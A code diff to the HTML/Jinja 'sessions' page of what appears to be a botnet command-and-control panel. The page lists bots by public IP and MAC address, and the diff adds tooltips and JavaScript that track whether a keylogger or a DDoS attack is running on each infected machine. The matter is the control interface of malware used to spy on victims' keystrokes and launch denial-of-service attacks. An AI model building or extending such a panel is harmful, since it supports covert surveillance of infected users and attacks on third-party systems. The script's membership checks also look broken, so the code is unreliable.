@@ -2,6 +2,13 @@
 {% set active_page = 'sessions' %}
 
 {% block body %}
+    <style>
+        .ui-tooltip {
+            white-space: pre-line;
+        }
+    </style>
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
+    <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.js"></script>
     <div class="tw-flex tw-justify-center tw-items-start tw-py-4">
         <div class="tw-min-h-54 tw-w-80 tw-flex tw-flex-col tw-bg-card tw-rounded-xl tw-py-4">
             <div class="tw-text-center">
@@ -77,17 +84,19 @@
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.uid }}</td>
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.public_ip }}</td>
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.mac_address }}</td>
-                                <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}">
-                                    {% if session.online %}
+                                {% if session.online %}
+                                    <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack not running">
                                         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6">
                                             <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
                                         </svg>
-                                    {% else %}
+                                    </td>
+                                {% else %}
+                                    <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Offline">
                                         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6">
                                             <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
                                         </svg>
-                                    {% endif %}
-                                </td>
+                                    </td>
+                                {% endif %}
                             </tr>
                         {% endfor %}
                     </tbody>
@@ -152,9 +161,27 @@
 						success: function(response) {
                 			i = this.ajaxI;
 							toastr.success("Bot " + i + ": " + response);
+                            $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                            var currentTitle = $('#status-' + uid).prop("title");
+                            var newTitle = "Online&#10;Keylogger not running&#10;DDoS attack not running";
+                            currentTitle = currentTitle.replace("Offline", newTitle);
                             if (response == "offline") {
+                                newTitle = "Offline";
                                 $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
                             }
+                            if (response in ["Keylogger started", "Keylogger is still running, please end it first"]) {
+                                newTitle = currentTitle.replace("Keylogger not running", "Keylogger running");
+                            }
+                            if (response == "Keylogger stopped") {
+                                newTitle = currentTitle.replace("Keylogger running", "Keylogger not running");
+                            }
+                            if (response in ["DDoS attack started", "DDoS attack already running"]) {
+                                newTitle = currentTitle.replace("DDoS attack not running", "DDoS attack running");
+                            }
+                            if (response == "DDoS attack stopped") {
+                                newTitle = currentTitle.replace("DDoS attack running", "DDoS attack not running");
+                            }
+                            $('#status-' + uid).prop("title", newTitle);
 			            }
 			        });
 			}
@@ -232,5 +259,14 @@
         }
 
         pollServer();
+    </script>
+
+    <script>
+        $(document).tooltip({
+            position: {
+                my: "left center",
+                at: "right+5 center"
+            }
+        });
     </script>
 {% endblock %}
